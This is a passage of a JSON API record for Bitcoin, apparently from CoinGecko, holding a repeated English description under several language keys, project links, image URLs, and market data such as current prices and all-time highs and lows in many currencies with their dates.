href=\""https://www.coingecko.com/buzz/ethereum-still-king-dapps-cryptokitties-need-1-billion-on-eos\"">CryptoKitties</a>."",
        ""no"": ""Bitcoin is the first successful internet money based on peer-to-peer technology; whereby no central bank or authority is involved in the transaction and production of the Bitcoin currency. It was created by an anonymous individual/group under the name, Satoshi Nakamoto. The source code is available publicly as an open source project, anybody can look at it and be part of the developmental process.\r\n\r\nBitcoin is changing the way we see money as we speak. The idea was to produce a means of exchange, independent of any central authority, that could be transferred electronically in a secure, verifiable and immutable way. It is a decentralized peer-to-peer internet currency making mobile payment easy, very low transaction fees, protects your identity, and it works anywhere all the time with no central authority and banks.\r\n\r\nBitcoin is designed to have only 21 million BTC ever created, thus making it a deflationary currency. Bitcoin uses the <a href=\""https://www.coingecko.com/en?hashing_algorithm=SHA-256\"">SHA-256</a> hashing algorithm with an average transaction confirmation time of 10 minutes. Miners today are mining Bitcoin using ASIC chip dedicated to only mining Bitcoin, and the hash rate has shot up to peta hashes.\r\n\r\nBeing the first successful online cryptography currency, Bitcoin has inspired other alternative currencies such as <a href=\""https://www.coingecko.com/en/coins/litecoin\"">Litecoin</a>, <a href=\""https://www.coingecko.com/en/coins/peercoin\"">Peercoin</a>, <a href=\""https://www.coingecko.com/en/coins/primecoin\"">Primecoin</a>, and so on.\r\n\r\nThe cryptocurrency then took off with the innovation of the turing-complete smart contract by <a href=\""https://www.coingecko.com/en/coins/ethereum\"">Ethereum</a> which led to the development of other amazing projects such as <a href=\""https://www.coingecko.com/en/coins/eos\"">EOS</a>, <a href=\""https://www.coingecko.com/en/coins/tron\"">Tron</a>, and even crypto-collectibles such as <a href=\""https://www.coingecko.com/buzz/ethereum-still-king-dapps-cryptokitties-need-1-billion-on-eos\"">CryptoKitties</a>."",
        ""sk"": ""Bitcoin is the first successful internet money based on peer-to-peer technology; whereby no central bank or authority is involved in the transaction and production of the Bitcoin currency. It was created by an anonymous individual/group under the name, Satoshi Nakamoto. The source code is available publicly as an open source project, anybody can look at it and be part of the developmental process.\r\n\r\nBitcoin is changing the way we see money as we speak. The idea was to produce a means of exchange, independent of any central authority, that could be transferred electronically in a secure, verifiable and immutable way. It is a decentralized peer-to-peer internet currency making mobile payment easy, very low transaction fees, protects your identity, and it works anywhere all the time with no central authority and banks.\r\n\r\nBitcoin is designed to have only 21 million BTC ever created, thus making it a deflationary currency. Bitcoin uses the <a href=\""https://www.coingecko.com/en?hashing_algorithm=SHA-256\"">SHA-256</a> hashing algorithm with an average transaction confirmation time of 10 minutes. Miners today are mining Bitcoin using ASIC chip dedicated to only mining Bitcoin, and the hash rate has shot up to peta hashes.\r\n\r\nBeing the first successful online cryptography currency, Bitcoin has inspired other alternative currencies such as <a href=\""https://www.coingecko.com/en/coins/litecoin\"">Litecoin</a>, <a href=\""https://www.coingecko.com/en/coins/peercoin\"">Peercoin</a>, <a href=\""https://www.coingecko.com/en/coins/primecoin\"">Primecoin</a>, and so on.\r\n\r\nThe cryptocurrency then took off with the innovation of the turing-complete smart contract by <a href=\""https://www.coingecko.com/en/coins/ethereum\"">Ethereum</a> which led to the development of other amazing projects such as <a href=\""https://www.coingecko.com/en/coins/eos\"">EOS</a>, <a href=\""https://www.coingecko.com/en/coins/tron\"">Tron</a>, and even crypto-collectibles such as <a href=\""https://www.coingecko.com/buzz/ethereum-still-king-dapps-cryptokitties-need-1-billion-on-eos\"">CryptoKitties</a>."",
        ""uk"": """",
        ""he"": ""Bitcoin is the first successful internet money based on peer-to-peer technology; whereby no central bank or authority is involved in the transaction and production of the Bitcoin currency. It was created by an anonymous individual/group under the name, Satoshi Nakamoto. The source code is available publicly as an open source project, anybody can look at it and be part of the developmental process.\r\n\r\nBitcoin is changing the way we see money as we speak. The idea was to produce a means of exchange, independent of any central authority, that could be transferred electronically in a secure, verifiable and immutable way. It is a decentralized peer-to-peer internet currency making mobile payment easy, very low transaction fees, protects your identity, and it works anywhere all the time with no central authority and banks.\r\n\r\nBitcoin is designed to have only 21 million BTC ever created, thus making it a deflationary currency. Bitcoin uses the <a href=\""https://www.coingecko.com/en?hashing_algorithm=SHA-256\"">SHA-256</a> hashing algorithm with an average transaction confirmation time of 10 minutes. Miners today are mining Bitcoin using ASIC chip dedicated to only mining Bitcoin, and the hash rate has shot up to peta hashes.\r\n\r\nBeing the first successful online cryptography currency, Bitcoin has inspired other alternative currencies such as <a href=\""https://www.coingecko.com/en/coins/litecoin\"">Litecoin</a>, <a href=\""https://www.coingecko.com/en/coins/peercoin\"">Peercoin</a>, <a href=\""https://www.coingecko.com/en/coins/primecoin\"">Primecoin</a>, and so on.\r\n\r\nThe cryptocurrency then took off with the innovation of the turing-complete smart contract by <a href=\""https://www.coingecko.com/en/coins/ethereum\"">Ethereum</a> which led to the development of other amazing projects such as <a href=\""https://www.coingecko.com/en/coins/eos\"">EOS</a>, <a href=\""https://www.coingecko.com/en/coins/tron\"">Tron</a>, and even crypto-collectibles such as <a href=\""https://www.coingecko.com/buzz/ethereum-still-king-dapps-cryptokitties-need-1-billion-on-eos\"">CryptoKitties</a>."",
        ""fi"": ""Bitcoin is the first successful internet money based on peer-to-peer technology; whereby no central bank or authority is involved in the transaction and production of the Bitcoin currency. It was created by an anonymous individual/group under the name, Satoshi Nakamoto. The source code is available publicly as an open source project, anybody can look at it and be part of the developmental process.\r\n\r\nBitcoin is changing the way we see money as we speak. The idea was to produce a means of exchange, independent of any central authority, that could be transferred electronically in a secure, verifiable and immutable way. It is a decentralized peer-to-peer internet currency making mobile payment easy, very low transaction fees, protects your identity, and it works anywhere all the time with no central authority and banks.\r\n\r\nBitcoin is designed to have only 21 million BTC ever created, thus making it a deflationary currency. Bitcoin uses the <a href=\""https://www.coingecko.com/en?hashing_algorithm=SHA-256\"">SHA-256</a> hashing algorithm with an average transaction confirmation time of 10 minutes. Miners today are mining Bitcoin using ASIC chip dedicated to only mining Bitcoin, and the hash rate has shot up to peta hashes.\r\n\r\nBeing the first successful online cryptography currency, Bitcoin has inspired other alternative currencies such as <a href=\""https://www.coingecko.com/en/coins/litecoin\"">Litecoin</a>, <a href=\""https://www.coingecko.com/en/coins/peercoin\"">Peercoin</a>, <a href=\""https://www.coingecko.com/en/coins/primecoin\"">Primecoin</a>, and so on.\r\n\r\nThe cryptocurrency then took off with the innovation of the turing-complete smart contract by <a href=\""https://www.coingecko.com/en/coins/ethereum\"">Ethereum</a> which led to the development of other amazing projects such as <a href=\""https://www.coingecko.com/en/coins/eos\"">EOS</a>, <a href=\""https://www.coingecko.com/en/coins/tron\"">Tron</a>, and even crypto-collectibles such as <a href=\""https://www.coingecko.com/buzz/ethereum-still-king-dapps-cryptokitties-need-1-billion-on-eos\"">CryptoKitties</a>."",
        ""bg"": ""Bitcoin is the first successful internet money based on peer-to-peer technology; whereby no central bank or authority is involved in the transaction and production of the Bitcoin currency. It was created by an anonymous individual/group under the name, Satoshi Nakamoto. The source code is available publicly as an open source project, anybody can look at it and be part of the developmental process.\r\n\r\nBitcoin is changing the way we see money as we speak. The idea was to produce a means of exchange, independent of any central authority, that could be transferred electronically in a secure, verifiable and immutable way. It is a decentralized peer-to-peer internet currency making mobile payment easy, very low transaction fees, protects your identity, and it works anywhere all the time with no central authority and banks.\r\n\r\nBitcoin is designed to have only 21 million BTC ever created, thus making it a deflationary currency. Bitcoin uses the <a href=\""https://www.coingecko.com/en?hashing_algorithm=SHA-256\"">SHA-256</a> hashing algorithm with an average transaction confirmation time of 10 minutes. Miners today are mining Bitcoin using ASIC chip dedicated to only mining Bitcoin, and the hash rate has shot up to peta hashes.\r\n\r\nBeing the first successful online cryptography currency, Bitcoin has inspired other alternative currencies such as <a href=\""https://www.coingecko.com/en/coins/litecoin\"">Litecoin</a>, <a href=\""https://www.coingecko.com/en/coins/peercoin\"">Peercoin</a>, <a href=\""https://www.coingecko.com/en/coins/primecoin\"">Primecoin</a>, and so on.\r\n\r\nThe cryptocurrency then took off with the innovation of the turing-complete smart contract by <a href=\""https://www.coingecko.com/en/coins/ethereum\"">Ethereum</a> which led to the development of other amazing projects such as <a href=\""https://www.coingecko.com/en/coins/eos\"">EOS</a>, <a href=\""https://www.coingecko.com/en/coins/tron\"">Tron</a>, and even crypto-collectibles such as <a href=\""https://www.coingecko.com/buzz/ethereum-still-king-dapps-cryptokitties-need-1-billion-on-eos\"">CryptoKitties</a>."",
        ""hr"": ""Bitcoin is the first successful internet money based on peer-to-peer technology; whereby no central bank or authority is involved in the transaction and production of the Bitcoin currency. It was created by an anonymous individual/group under the name, Satoshi Nakamoto. The source code is available publicly as an open source project, anybody can look at it and be part of the developmental process.\r\n\r\nBitcoin is changing the way we see money as we speak. The idea was to produce a means of exchange, independent of any central authority, that could be transferred electronically in a secure, verifiable and immutable way. It is a decentralized peer-to-peer internet currency making mobile payment easy, very low transaction fees, protects your identity, and it works anywhere all the time with no central authority and banks.\r\n\r\nBitcoin is designed to have only 21 million BTC ever created, thus making it a deflationary currency. Bitcoin uses the <a href=\""https://www.coingecko.com/en?hashing_algorithm=SHA-256\"">SHA-256</a> hashing algorithm with an average transaction confirmation time of 10 minutes. Miners today are mining Bitcoin using ASIC chip dedicated to only mining Bitcoin, and the hash rate has shot up to peta hashes.\r\n\r\nBeing the first successful online cryptography currency, Bitcoin has inspired other alternative currencies such as <a href=\""https://www.coingecko.com/en/coins/litecoin\"">Litecoin</a>, <a href=\""https://www.coingecko.com/en/coins/peercoin\"">Peercoin</a>, <a href=\""https://www.coingecko.com/en/coins/primecoin\"">Primecoin</a>, and so on.\r\n\r\nThe cryptocurrency then took off with the innovation of the turing-complete smart contract by <a href=\""https://www.coingecko.com/en/coins/ethereum\"">Ethereum</a> which led to the development of other amazing projects such as <a href=\""https://www.coingecko.com/en/coins/eos\"">EOS</a>, <a href=\""https://www.coingecko.com/en/coins/tron\"">Tron</a>, and even crypto-collectibles such as <a href=\""https://www.coingecko.com/buzz/ethereum-still-king-dapps-cryptokitties-need-1-billion-on-eos\"">CryptoKitties</a>."",
        ""lt"": ""Bitcoin is the first successful internet money based on peer-to-peer technology; whereby no central bank or authority is involved in the transaction and production of the Bitcoin currency. It was created by an anonymous individual/group under the name, Satoshi Nakamoto. The source code is available publicly as an open source project, anybody can look at it and be part of the developmental process.\r\n\r\nBitcoin is changing the way we see money as we speak. The idea was to produce a means of exchange, independent of any central authority, that could be transferred electronically in a secure, verifiable and immutable way. It is a decentralized peer-to-peer internet currency making mobile payment easy, very low transaction fees, protects your identity, and it works anywhere all the time with no central authority and banks.\r\n\r\nBitcoin is designed to have only 21 million BTC ever created, thus making it a deflationary currency. Bitcoin uses the <a href=\""https://www.coingecko.com/en?hashing_algorithm=SHA-256\"">SHA-256</a> hashing algorithm with an average transaction confirmation time of 10 minutes. Miners today are mining Bitcoin using ASIC chip dedicated to only mining Bitcoin, and the hash rate has shot up to peta hashes.\r\n\r\nBeing the first successful online cryptography currency, Bitcoin has inspired other alternative currencies such as <a href=\""https://www.coingecko.com/en/coins/litecoin\"">Litecoin</a>, <a href=\""https://www.coingecko.com/en/coins/peercoin\"">Peercoin</a>, <a href=\""https://www.coingecko.com/en/coins/primecoin\"">Primecoin</a>, and so on.\r\n\r\nThe cryptocurrency then took off with the innovation of the turing-complete smart contract by <a href=\""https://www.coingecko.com/en/coins/ethereum\"">Ethereum</a> which led to the development of other amazing projects such as <a href=\""https://www.coingecko.com/en/coins/eos\"">EOS</a>, <a href=\""https://www.coingecko.com/en/coins/tron\"">Tron</a>, and even crypto-collectibles such as <a href=\""https://www.coingecko.com/buzz/ethereum-still-king-dapps-cryptokitties-need-1-billion-on-eos\"">CryptoKitties</a>."",
        ""sl"": ""Bitcoin is the first successful internet money based on peer-to-peer technology; whereby no central bank or authority is involved in the transaction and production of the Bitcoin currency. It was created by an anonymous individual/group under the name, Satoshi Nakamoto. The source code is available publicly as an open source project, anybody can look at it and be part of the developmental process.\r\n\r\nBitcoin is changing the way we see money as we speak. The idea was to produce a means of exchange, independent of any central authority, that could be transferred electronically in a secure, verifiable and immutable way. It is a decentralized peer-to-peer internet currency making mobile payment easy, very low transaction fees, protects your identity, and it works anywhere all the time with no central authority and banks.\r\n\r\nBitcoin is designed to have only 21 million BTC ever created, thus making it a deflationary currency. Bitcoin uses the <a href=\""https://www.coingecko.com/en?hashing_algorithm=SHA-256\"">SHA-256</a> hashing algorithm with an average transaction confirmation time of 10 minutes. Miners today are mining Bitcoin using ASIC chip dedicated to only mining Bitcoin, and the hash rate has shot up to peta hashes.\r\n\r\nBeing the first successful online cryptography currency, Bitcoin has inspired other alternative currencies such as <a href=\""https://www.coingecko.com/en/coins/litecoin\"">Litecoin</a>, <a href=\""https://www.coingecko.com/en/coins/peercoin\"">Peercoin</a>, <a href=\""https://www.coingecko.com/en/coins/primecoin\"">Primecoin</a>, and so on.\r\n\r\nThe cryptocurrency then took off with the innovation of the turing-complete smart contract by <a href=\""https://www.coingecko.com/en/coins/ethereum\"">Ethereum</a> which led to the development of other amazing projects such as <a href=\""https://www.coingecko.com/en/coins/eos\"">EOS</a>, <a href=\""https://www.coingecko.com/en/coins/tron\"">Tron</a>, and even crypto-collectibles such as <a href=\""https://www.coingecko.com/buzz/ethereum-still-king-dapps-cryptokitties-need-1-billion-on-eos\"">CryptoKitties</a>.""
    },
    ""links"": {
        ""homepage"": [
            ""http://www.bitcoin.org"",
            """",
            """"
        ],
        ""whitepaper"": ""https://bitcoin.org/bitcoin.pdf"",
        ""blockchain_site"": [
            ""https://mempool.space/"",
            ""https://blockchair.com/bitcoin/"",
            ""https://btc.com/"",
            ""https://btc.tokenview.io/"",
            ""https://www.oklink.com/btc"",
            ""https://3xpl.com/bitcoin"",
            """",
            """",
            """",
            """"
        ],
        ""official_forum_url"": [
            ""https://bitcointalk.org/"",
            """",
            """"
        ],
        ""chat_url"": [
            """",
            """",
            """"
        ],
        ""announcement_url"": [
            """",
            """"
        ],
        ""twitter_screen_name"": ""bitcoin"",
        ""facebook_username"": ""bitcoins"",
        ""bitcointalk_thread_identifier"": null,
        ""telegram_channel_identifier"": """",
        ""subreddit_url"": ""https://www.reddit.com/r/Bitcoin/"",
        ""repos_url"": {
            ""github"": [
                ""https://github.com/bitcoin/bitcoin"",
                ""https://github.com/bitcoin/bips""
            ],
            ""bitbucket"": []
        }
    },
    ""image"": {
        ""thumb"": ""https://assets.coingecko.com/coins/images/1/thumb/bitcoin.png?1696501400"",
        ""small"": ""https://assets.coingecko.com/coins/images/1/small/bitcoin.png?1696501400"",
        ""large"": ""https://assets.coingecko.com/coins/images/1/large/bitcoin.png?1696501400""
    },
    ""country_origin"": """",
    ""genesis_date"": ""2009-01-03"",
    ""sentiment_votes_up_percentage"": 86.73,
    ""sentiment_votes_down_percentage"": 13.27,
    ""watchlist_portfolio_users"": 1534726,
    ""market_cap_rank"": 1,
    ""market_data"": {
        ""current_price"": {
            ""aed"": 260151,
            ""ars"": 60759354,
            ""aud"": 108606,
            ""bch"": 103.42,
            ""bdt"": 7771601,
            ""bhd"": 26698,
            ""bmd"": 70841,
            ""bnb"": 117.437,
            ""brl"": 355249,
            ""btc"": 1.0,
            ""cad"": 95858,
            ""chf"": 63921,
            ""clp"": 69452385,
            ""cny"": 511950,
            ""czk"": 1660467,
            ""dkk"": 489920,
            ""dot"": 7363,
            ""eos"": 63905,
            ""eth"": 19.622312,
            ""eur"": 65682,
            ""gbp"": 56100,
            ""gel"": 190918,
            ""hkd"": 554479,
            ""huf"": 25885460,
            ""idr"": 1125987346,
            ""ils"": 261706,
            ""inr"": 5903199,
            ""jpy"": 10716361,
            ""krw"": 95388873,
            ""kwd"": 21787,
            ""lkr"": 21275380,
            ""ltc"": 639.307,
            ""mmk"": 148703318,
            ""mxn"": 1173474,
            ""myr"": 334690,
            ""ngn"": 100665676,
            ""nok"": 767479,
            ""nzd"": 118424,
            ""php"": 3978916,
            ""pkr"": 19682159,
            ""pln"": 282217,
            ""rub"": 6559392,
            ""sar"": 265691,
            ""sek"": 756543,
            ""sgd"": 95544,
            ""thb"": 2576503,
            ""try"": 2297629,
            ""twd"": 2265544,
            ""uah"": 2777624,
            ""usd"": 70841,
            ""vef"": 7093.35,
            ""vnd"": 1758070300,
            ""xag"": 2824.2,
            ""xau"": 31.39,
            ""xdr"": 53487,
            ""xlm"": 500673,
            ""xrp"": 112482,
            ""yfi"": 7.649581,
            ""zar"": 1336579,
            ""bits"": 999752,
            ""link"": 3695,
            ""sats"": 99975221
        },
        ""total_value_locked"": null,
        ""mcap_to_tvl_ratio"": null,
        ""fdv_to_tvl_ratio"": null,
        ""roi"": null,
        ""ath"": {
            ""aed"": 270832,
            ""ars"": 62658241,
            ""aud"": 111440,
            ""bch"": 270.677,
            ""bdt"": 8091216,
            ""bhd"": 27794,
            ""bmd"": 73738,
            ""bnb"": 143062,
            ""brl"": 380542,
            ""btc"": 1.003301,
            ""cad"": 99381,
            ""chf"": 64880,
            ""clp"": 70749614,
            ""cny"": 530375,
            ""czk"": 1703814,
            ""dkk"": 502620,
            ""dot"": 8268,
            ""eos"": 75439,
            ""eth"": 624.203,
            ""eur"": 67405,
            ""gbp"": 57639,
            ""gel"": 195419,
            ""hkd"": 576788,
            ""huf"": 26873106,
            ""idr"": 1149293683,
            ""ils"": 270420,
            ""inr"": 6110932,
            ""jpy"": 10906158,
            ""krw"": 97195531,
            ""kwd"": 22651,
            ""lkr"": 22592284,
            ""ltc"": 838.013,
            ""mmk"": 154750684,
            ""mxn"": 1409247,
            ""myr"": 345647,
            ""ngn"": 118524884,
            ""nok"": 774448,
            ""nzd"": 119747,
            ""php"": 4084271,
            ""pkr"": 20569197,
            ""pln"": 288843,
            ""rub"": 6746469,
            ""sar"": 276540,
            ""sek"": 763870,
            ""sgd"": 98281,
            ""thb"": 2631375,
            ""try"": 2368817,
            ""twd"": 2323593,
            ""uah"": 2856689,
            ""usd"": 73738,
            ""vef"": 8618768857,
            ""vnd"": 1820914622,
            ""xag"": 3040.05,
            ""xau"": 37.72,
            ""xdr"": 55169,
            ""xlm"": 534497,
            ""xrp"": 159288,
            ""yfi"": 11.593182,
            ""zar"": 1375794,
            ""bits"": 1058236,
            ""link"": 74906,
            ""sats"": 105823579
        },
        ""ath_change_percentage"": {
            ""aed"": -3.99439,
            ""ars"": -3.10536,
            ""aud"": -2.64369,
            ""bch"": -61.6388,
            ""bdt"": -4.00073,
            ""bhd"": -3.99552,
            ""bmd"": -3.9787,
            ""bnb"": -99.91808,
            ""brl"": -6.69586,
            ""btc"": -0.32896,
            ""cad"": -3.61649,
            ""chf"": -1.54288,
            ""clp"": -1.88525,
            ""cny"": -3.52214,
            ""czk"": -2.61461,
            ""dkk"": -2.60091,
            ""dot"": -11.06894,
            ""eos"": -15.44916,
            ""eth"": -96.85724,
            ""eur"": -2.63007,
            ""gbp"": -2.72426,
            ""gel"": -2.35466,
            ""hkd"": -3.92874,
            ""huf"": -3.7482,
            ""idr"": -2.11854,
            ""ils"": -3.27342,
            ""inr"": -3.44243,
            ""jpy"": -1.79949,
            ""krw"": -1.90262,
            ""kwd"": -3.86117,
            ""lkr"": -5.8786,
            ""ltc"": -23.99975,
            ""mmk"": -3.95842,
            ""mxn"": -16.78885,
            ""myr"": -3.22078,
            ""ngn"": -15.11263,
            ""nok"": -0.9899,
            ""nzd"": -1.21617,
            ""php"": -2.63345,
            ""pkr"": -4.36286,
            ""pln"": -2.36814,
            ""rub"": -2.82417,
            ""sar"": -3.97366,
            ""sek"": -1.03717,
            ""sgd"": -2.82205,
            ""thb"": -2.13687,
            ""try"": -3.06138,
            ""twd"": -2.56634,
            ""uah"": -2.81894,
            ""usd"": -3.9787,
            ""vef"": -99.99992,
            ""vnd"": -3.5021,
            ""xag"": -7.46222,
            ""xau"": -16.84563,
            ""xdr"": -3.1006,
            ""xlm"": -6.41572,
            ""xrp"": -29.37767,
            ""yfi"": -34.26224,
            ""zar"": -2.93651,
            ""bits"": -5.56403,
            ""link"": -95.07465,
            ""sats"": -5.56403
        },
        ""ath_date"": {
            ""aed"": ""2024-03-14T07:10:36.635Z"",
            ""ars"": ""2024-03-14T07:10:36.635Z"",
            ""aud"": ""2024-03-14T07:10:36.635Z"",
            ""bch"": ""2023-06-10T04:30:21.139Z"",
            ""bdt"": ""2024-03-14T07:10:36.635Z"",
            ""bhd"": ""2024-03-14T07:10:36.635Z"",
            ""bmd"": ""2024-03-14T07:10:36.635Z"",
            ""bnb"": ""2017-10-19T00:00:00.000Z"",
            ""brl"": ""2021-11-09T04:09:45.771Z"",
            ""btc"": ""2019-10-15T16:00:56.136Z"",
            ""cad"": ""2024-03-14T07:10:36.635Z"",
            ""chf"": ""2024-03-14T07:10:36.635Z"",
            ""clp"": ""2024-03-13T09:15:27.924Z"",
            ""cny"": ""2024-03-14T07:10:36.635Z"",
            ""czk"": ""2024-03-13T09:15:27.924Z"",
            ""dkk"": ""2024-03-14T07:10:36.635Z"",
            ""dot"": ""2023-10-27T11:45:24.509Z"",
            ""eos"": ""2024-02-28T19:15:25.279Z"",
            ""eth"": ""2015-10-20T00:00:00.000Z"",
            ""eur"": ""2024-03-14T07:10:36.635Z"",
            ""gbp"": ""2024-03-14T07:10:36.635Z"",
            ""gel"": ""2024-03-13T09:15:27.924Z"",
            ""hkd"": ""2024-03-14T07:10:36.635Z"",
            ""huf"": ""2024-03-13T08:35:34.668Z"",
            ""idr"": ""2024-03-14T07:10:36.635Z"",
            ""ils"": ""2024-03-13T09:15:27.924Z"",
            ""inr"": ""2024-03-14T07:10:36.635Z"",
            ""jpy"": ""2024-03-14T07:10:36.635Z"",
            ""krw"": ""2024-03-14T07:10:36.635Z"",
            ""kwd"": ""2024-03-14T07:10:36.635Z"",
            ""lkr"": ""2024-03-13T09:15:27.924Z"",
            ""ltc"": ""2024-02-29T00:00:22.489Z"",
            ""mmk"": ""2024-03-14T07:10:36.635Z"",
            ""mxn"": ""2021-11-10T17:30:22.767Z"",
            ""myr"": ""2024-03-14T07:10:36.635Z"",
            ""ngn"": ""2024-03-14T07:10:36.635Z"",
            ""nok"": ""2024-03-28T15:54:20.286Z"",
            ""nzd"": ""2024-03-14T07:10:36.635Z"",
            ""php"": ""2024-03-14T07:10:36.635Z"",
            ""pkr"": ""2024-03-14T07:10:36.635Z"",
            ""pln"": ""2024-03-13T09:15:27.924Z"",
            ""rub"": ""2024-03-13T09:15:27.924Z"",
            ""sar"": ""2024-03-14T07:10:36.635Z"",
            ""sek"": ""2024-03-28T15:54:20.286Z"",
            ""sgd"": ""2024-03-14T07:10:36.635Z"",
            ""thb"": ""2024-03-14T07:10:36.635Z"",
            ""try"": ""2024-03-14T07:10:36.635Z"",
            ""twd"": ""2024-03-14T07:10:36.635Z"",
            ""uah"": ""2024-03-14T07:10:36.635Z"",
            ""usd"": ""2024-03-14T07:10:36.635Z"",
            ""vef"": ""2021-01-03T12:04:17.372Z"",
            ""vnd"": ""2024-03-14T07:10:36.635Z"",
            ""xag"": ""2024-03-13T09:15:27.924Z"",
            ""xau"": ""2021-10-20T14:54:17.702Z"",
            ""xdr"": ""2024-03-14T07:10:36.635Z"",
            ""xlm"": ""2024-03-18T19:06:11.686Z"",
            ""xrp"": ""2021-01-03T07:54:40.240Z"",
            ""yfi"": ""2020-07-18T00:00:00.000Z"",
            ""zar"": ""2024-03-13T08:35:34.668Z"",
            ""bits"": ""2021-05-19T16:00:11.072Z"",
            ""link"": ""2017-12-12T00:00:00.000Z"",
            ""sats"": ""2021-05-19T16:00:11.072Z""
        },
        ""atl"": {
            ""aed"": 632.31,
            ""ars"": 1478.98,
            ""aud"": 72.61,
            ""bch"": 3.513889,
            ""bdt"": 9390.25,
            ""bhd"": 45.91,
            ""bmd"": 121.77,
            ""bnb"": 52.17,
            ""brl"": 149.66,
            ""btc"": 0.99895134,
            ""cad"": 69.81,
            ""chf"": 63.26,
            ""clp"": 107408,
            ""cny"": 407.23,
            ""czk"": 4101.56,
            ""dkk"": 382.47,
            ""dot"": 991.882,
            ""eos"": 908.141,
            ""eth"": 6.779735,
            ""eur"": 51.3,
            ""gbp"": 43.9,
            ""gel"": 102272,
            ""hkd"": 514.37,
            ""huf"": 46598,
            ""idr"": 658780,
            ""ils"": 672.18,
            ""inr"": 3993.42,
            ""jpy"": 6641.83,
            ""krw"": 75594,
            ""kwd"": 50.61,
            ""lkr"": 22646,
            ""ltc"": 20.707835,
            ""mmk"": 117588,
            ""mxn"": 859.32,
            ""myr"": 211.18,
            ""ngn"": 10932.64,
            ""nok"": 1316.03,
            ""nzd"": 84.85,
            ""php"": 2880.5,
            ""pkr"": 17315.84,
            ""pln"": 220.11,
            ""rub"": 2206.43,
            ""sar"": 646.04,
            ""sek"": 443.81,
            ""sgd"": 84.47,
            ""thb"": 5644.35,
            ""try"": 392.91,
            ""twd"": 1998.66,
            ""uah"": 553.37,
            ""usd"": 67.81,
            ""vef"": 766.19,
            ""vnd"": 3672339,
            ""xag"": 3.37,
            ""xau"": 0.0531,
            ""xdr"": 44.39,
            ""xlm"": 21608,
            ""xrp"": 9908,
            ""yfi"": 0.23958075,
            ""zar"": 666.26,
            ""bits"": 950993,
            ""link"": 598.477,
            ""sats"": 95099268
        },
        ""atl_change_percentage"": {
            ""aed"": 41021.01935,
            ""ars"": 4104931.17408,
            ""aud"": 149320.65386,
            ""bch"": 2854.98703,
            ""bdt"": 82618.82374,
            ""bhd"": 58017.41,
            ""bmd"": 58045.78515,
            ""bnb"": 124.64031,
            ""brl"": 237147.75639,
            ""btc"": 0.10498,
            ""cad"": 137118.29117,
            ""chf"": 100876.09607,
            ""clp"": 64528.03028,
            ""cny"": 125553.86126,
            ""czk"": 40354.53688,
            ""dkk"": 127897.1074,
            ""dot"": 641.32122,
            ""eos"": 6923.63842,
            ""eth"": 189.35031,
            ""eur"": 127842.76131,
            ""gbp"": 127613.26954,
            ""gel"": 86.5788,
            ""hkd"": 107628.27837,
            ""huf"": 55408.43824,
            ""idr"": 170661.942,
            ""ils"": 38813.17338,
            ""inr"": 147657.27885,
            ""jpy"": 161149.22381,
            ""krw"": 126029.75569,
            ""kwd"": 42926.2885,
            ""lkr"": 93796.91396,
            ""ltc"": 2975.60848,
            ""mmk"": 126294.745,
            ""mxn"": 136362.88283,
            ""myr"": 158305.34773,
            ""ngn"": 920195.88075,
            ""nok"": 58164.94551,
            ""nzd"": 139304.12481,
            ""php"": 137956.24089,
            ""pkr"": 113505.73882,
            ""pln"": 128018.02033,
            ""rub"": 297028.30653,
            ""sar"": 41004.48178,
            ""sek"": 170232.97502,
            ""sgd"": 112971.90127,
            ""thb"": 45523.44807,
            ""try"": 584334.59169,
            ""twd"": 113174.24171,
            ""uah"": 501584.44297,
            ""usd"": 104316.9986,
            ""vef"": 825.30852,
            ""vnd"": 47748.09377,
            ""xag"": 83384.96717,
            ""xau"": 58962.10557,
            ""xdr"": 120325.57665,
            ""xlm"": 2214.87516,
            ""xrp"": 1035.37698,
            ""yfi"": 3081.01438,
            ""zar"": 200330.02044,
            ""bits"": 5.08548,
            ""link"": 516.46411,
            ""sats"": 5.08548
        },
        ""atl_date"": {
            ""aed"": ""2015-01-14T00:00:00.000Z"",
            ""ars"": ""2015-01-14T00:00:00.000Z"",
            ""aud"": ""2013-07-05T00:00:00.000Z"",
            ""bch"": ""2017-08-02T00:00:00.000Z"",
            ""bdt"": ""2013-09-08T00:00:00.000Z"",
            ""bhd"": ""2013-09-08T00:00:00.000Z"",
            ""bmd"": ""2013-09-08T00:00:00.000Z"",
            ""bnb"": ""2022-11-27T02:35:06.345Z"",
            ""brl"": ""2013-07-05T00:00:00.000Z"",
            ""btc"": ""2019-10-21T00:00:00.000Z"",
            ""cad"": ""2013-07-05T00:00:00.000Z"",
            ""chf"": ""2013-07-05T00:00:00.000Z"",
            ""clp"": ""2015-01-14T00:00:00.000Z"",
            ""cny"": ""2013-07-05T00:00:00.000Z"",
            ""czk"": ""2015-01-14T00:00:00.000Z"",
            ""dkk"": ""2013-07-05T00:00:00.000Z"",
            ""dot"": ""2021-05-19T11:04:48.978Z"",
            ""eos"": ""2019-04-11T00:00:00.000Z"",
            ""eth"": ""2017-06-12T00:00:00.000Z"",
            ""eur"": ""2013-07-05T00:00:00.000Z"",
            ""gbp"": ""2013-07-05T00:00:00.000Z"",
            ""gel"": ""2024-01-23T14:25:15.024Z"",
            ""hkd"": ""2013-07-05T00:00:00.000Z"",
            ""huf"": ""2015-01-14T00:00:00.000Z"",
            ""idr"": ""2013-07-05T00:00:00.000Z"",
            ""ils"": ""2015-01-14T00:00:00.000Z"",
            ""inr"": ""2013-07-05T00:00:00.000Z"",
            ""jpy"": ""2013-07-05T00:00:00.000Z"",
            ""krw"": ""2013-07-05T00:00:00.000Z"",
            ""kwd"": ""2015-01-14T00:00:00.000Z"",
            ""lkr"": ""2015-01-14T00:00:00.000Z"",
            ""ltc"": ""2013-11-28T00:00:00.000Z"",
            ""mmk"": ""2013-09-08T00:00:00.000Z"",
            ""mxn"": ""2013-07-05T00:00:00.000Z"",
            ""myr"": ""2013-07-05T00:00:00.000Z"",
            ""ngn"": ""2013-07-06T00:00:00.000Z"",
            ""nok"": ""2015-01-14T00:00:00.000Z"",
            ""nzd"": ""2013-07-05T00:00:00.000Z"",
            ""php"": ""2013-07-05T00:00:00.000Z"",
            ""pkr"": ""2015-01-14T00:00:00.000Z"",
            ""pln"": ""2013-07-05T00:00:00.000Z"",
            ""rub"": ""2013-07-05T00:00:00.000Z"",
            ""sar"": ""2015-01-14T00:00:00.000Z"",
            ""sek"": ""2013-07-05T00:00:00.000Z"",
            ""sgd"": ""2013-07-05T00:00:00.000Z"",
            ""thb"": ""2015-01-14T00:00:00.000Z"",
            ""try"": ""2015-01-14T00:00:00.000Z"",
